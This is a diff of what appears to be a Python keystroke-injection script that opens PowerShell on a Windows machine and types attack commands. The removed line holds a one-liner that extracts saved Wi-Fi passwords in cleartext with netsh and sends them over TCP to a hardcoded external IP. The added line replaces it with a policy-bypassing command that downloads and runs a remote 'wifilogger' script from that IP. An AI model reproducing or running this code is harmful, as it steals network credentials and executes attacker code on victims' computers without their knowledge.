@@ -21,9 +21,9 @@ layout.write("powershell\n")
 time.sleep(2)  # Wait for PowerShell to open
 
 # Step 3: Type the PowerShell command to send wifi credentials to the server
-powershell_command = '$ip="52.202.38.242";$port=5555;$profiles=(netsh wlan show profiles)|Select-String "All User Profile"|%{$_.ToString().Split(":")[1].Trim()};$data=@();foreach($p in $profiles){$info=netsh wlan show profile name="$p" key=clear|Select-String "Key Content";if($info){$pw=$info.ToString().Split(":")[1].Trim();$data+=@{SSID=$p;Password=$pw}}};$json=$data|ConvertTo-Json;$c=New-Object Net.Sockets.TcpClient($ip,$port);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.Write($json);$w.Flush();$w.Close();$c.Close()'
+powershell_command = 'powershell -ep bypass -c "iex (iwr http://52.202.38.242/wifilogger.ps1)"'
 layout.write(powershell_command + "\n")  # Type command and press Enter
-time.sleep(1.7)  # Wait for command execution
+time.sleep(1.4)  # Wait for command execution
 layout.write("exit\n")  # Close PowerShell
 
 # Step 4: Open Run dialog
